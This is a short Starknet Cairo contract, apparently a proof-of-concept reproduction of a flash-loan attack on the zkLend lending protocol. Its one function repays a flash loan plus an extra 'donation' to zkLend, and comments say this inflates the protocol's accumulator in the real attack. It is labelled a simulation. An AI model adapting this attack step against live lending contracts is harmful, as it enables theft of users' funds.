use starknet::ContractAddress;
use openzeppelin_token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};

#[starknet::interface]
pub trait IFlashLoanAttacker<TContractState> {
    fn execute_attack_cycle(
        ref self: TContractState,
        zklend_address: ContractAddress,
        token_address: ContractAddress,
        flash_amount: u256,
        donation_amount: u256
    );
    fn get_attack_success(self: @TContractState) -> bool;
}

#[starknet::contract]
pub mod FlashLoanAttacker {
    use super::{IERC20Dispatcher, IERC20DispatcherTrait};
    use starknet::{ContractAddress, get_caller_address, get_contract_address};
    use starknet::storage::{StoragePointerWriteAccess, StoragePointerReadAccess};

    #[storage]
    struct Storage {
        attack_success: bool,
        owner: ContractAddress,
    }

    #[constructor]
    fn constructor(ref self: ContractState, owner: ContractAddress) {
        self.owner.write(owner);
    }

    #[abi(embed_v0)]
    impl FlashLoanAttackerImpl of super::IFlashLoanAttacker<ContractState> {
        fn execute_attack_cycle(
            ref self: ContractState,
            zklend_address: ContractAddress,
            token_address: ContractAddress,
            flash_amount: u256,
            donation_amount: u256
        ) {
            // This function simulates the flash loan callback execution
            // In the real attack, this would be called by the zkLend contract
            
            let this_contract = get_contract_address();
            let token_contract = IERC20Dispatcher { contract_address: token_address };
            
            // Simulate receiving the flash loan
            // The attacker repays the flash loan + fee + donation
            let total_repay = flash_amount + donation_amount; 
            
            // Transfer the excess amount (donation) back to zkLend
            // This inflates the accumulator in the real attack
            let success = token_contract.transfer(zklend_address, total_repay);
            
            if success {
                self.attack_success.write(true);
            }
        }

        fn get_attack_success(self: @ContractState) -> bool {
            self.attack_success.read()
        }
    }
}